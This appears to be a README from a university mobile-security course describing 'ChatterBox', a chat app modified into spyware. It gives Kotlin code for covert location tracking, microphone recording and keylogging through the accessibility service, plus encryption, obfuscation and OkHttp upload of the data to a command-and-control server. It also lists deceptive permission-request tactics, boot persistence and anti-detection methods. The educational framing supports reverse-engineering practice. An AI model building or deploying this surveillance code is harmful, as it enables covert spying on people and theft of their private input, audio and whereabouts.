# ChatterBox Malicious Functionality Documentation

This document explains the malicious functionality implemented in the ChatterBox application for educational purposes in the ICT2215 Mobile Security module.

## Overview

The ChatterBox application has been modified to include covert data collection and exfiltration capabilities. The malicious functionality is designed to collect:

1. Location data (both foreground and background)
2. Audio recordings from the device microphone
3. Photos taken with the device camera at regular intervals
4. Keylogging through the accessibility service

All collected data is encrypted, obfuscated, and sent to a Command & Control (C2) server.

## Implementation Details

### 1. Main Components

The malicious functionality consists of the following components:

- **DataCollectionService**: A background service that collects location, audio, and photos every 30 seconds
- **KeyloggerService**: An accessibility service that monitors user input across the device
- **StartupReceiver**: A broadcast receiver that automatically starts the services when the device boots up
- **C2Connection**: A utility class for communicating with the C2 server
- **MainActivity modifications**: Code to request necessary permissions and start the malicious services

### 2. Permission Acquisition Strategy

The app uses several techniques to acquire the necessary permissions:

- **Permission Obfuscation**: Permissions are requested with innocent-sounding explanations
- **Two-Stage Requests**: Standard permissions are requested first, followed by more sensitive ones
- **Background Launch**: The services start in the background after acquiring permissions
- **Persistent Reminders**: The app repeatedly prompts for permissions until granted

### 3. Data Collection Methods

#### Location Collection
```kotlin
private fun startLocationUpdates() {
    locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
        locationManager?.requestLocationUpdates(
            LocationManager.GPS_PROVIDER,
            COLLECTION_INTERVAL,
            10f,
            locationListener
        )
    }
}
```

#### Audio Recording
```kotlin
private fun startVoiceRecording() {
    val audioFile = File(externalCacheDir, "audio_${System.currentTimeMillis()}.3gp")
    
    mediaRecorder = MediaRecorder().apply {
        setAudioSource(MediaRecorder.AudioSource.MIC)
        setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        setOutputFile(audioFile.absolutePath)
        setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        prepare()
        start()
        
        // Record for 10 seconds
        handler.postDelayed({
            stopVoiceRecording()
            saveData("audio", audioFile.absolutePath)
        }, 10000)
    }
}
```

#### Photo Taking
```kotlin
private fun takePhoto() {
    val outputFile = File(externalCacheDir, "capture_${System.currentTimeMillis()}.jpg")
    
    val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    val cameraId = getFrontFacingCameraId(cameraManager)
    
    // The actual implementation would use Camera2 API to take a photo
    // This is simplified for demonstration
}
```

#### Keylogging
```kotlin
override fun onAccessibilityEvent(event: AccessibilityEvent) {
    when (event.eventType) {
        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
            // Capture text input
            val packageName = event.packageName?.toString() ?: "unknown"
            val eventText = event.text?.joinToString() ?: ""
            
            if (eventText.isNotEmpty()) {
                val data = "TEXT_INPUT:$packageName:$eventText"
                logKeyboardInput(data)
            }
        }
    }
}
```

### 4. Data Exfiltration

All collected data is encrypted using AES encryption with a hardcoded key, then obfuscated before being sent to the C2 server.

```kotlin
private fun encrypt(data: String): String {
    val md = MessageDigest.getInstance("SHA-256")
    val key = md.digest(SECRET_KEY.toByteArray()).copyOf(16) // AES requires 16, 24, or 32 bytes
    val secretKey = SecretKeySpec(key, "AES")
    
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.ENCRYPT_MODE, secretKey)
    
    val encryptedBytes = cipher.doFinal(data.toByteArray())
    return Base64.encodeToString(encryptedBytes, Base64.DEFAULT)
}

private fun obfuscateData(data: String): String {
    // Simple obfuscation - in a real scenario, this would be more sophisticated
    val reversed = data.reversed()
    return Base64.encodeToString(reversed.toByteArray(), Base64.DEFAULT)
}
```

Data is sent to the C2 server using the OkHttp library:

```kotlin
val requestBody = MultipartBody.Builder()
    .setType(MultipartBody.FORM)
    .addFormDataPart(
        "data",
        "data.txt",
        RequestBody.create(
            "text/plain".toMediaTypeOrNull(),
            obfuscateData(dataFile.readText())
        )
    )
    .build()

val request = Request.Builder()
    .url(C2_SERVER_URL)
    .post(requestBody)
    .build()

httpClient.newCall(request).execute()
```

### 5. Anti-Detection Techniques

Several techniques are used to avoid detection:

- **Obfuscated Service Names**: Using innocent names like "DataCollectionService" instead of "SpyService"
- **Delayed Execution**: Services start after a delay to avoid raising suspicion
- **C2 Server Obfuscation**: The C2 server URL is constructed from parts to avoid static analysis
- **Innocent Descriptions**: Using harmless descriptions for malicious components
- **Secret File Storage**: Data is stored in private app directories

## C2 Server

A Python-based C2 server is included to receive the exfiltrated data. It:

1. Listens for HTTP requests from infected devices
2. Decrypts and deobfuscates received data
3. Stores data organized by device ID and data type
4. Provides logging for analysis

## Educational Purpose

This implementation is purely for educational purposes in the ICT2215 Mobile Security module. It demonstrates how malicious code can be integrated into seemingly innocent applications and how data can be exfiltrated covertly.

Understanding these techniques is essential for security professionals to better protect against such threats in real-world scenarios.

## Reversing Challenge

The implementation includes several intentional challenges for reverse engineering practice:

1. Obfuscated method names and variables
2. Multi-layer encryption and encoding
3. Indirect service activation
4. Hidden C2 communication
5. Permission request obfuscation

## Legal and Ethical Disclaimer

This code is provided solely for educational purposes. Using this code to collect data from devices without explicit permission is illegal and unethical. Always practice ethical hacking and obtain proper authorization before security testing.
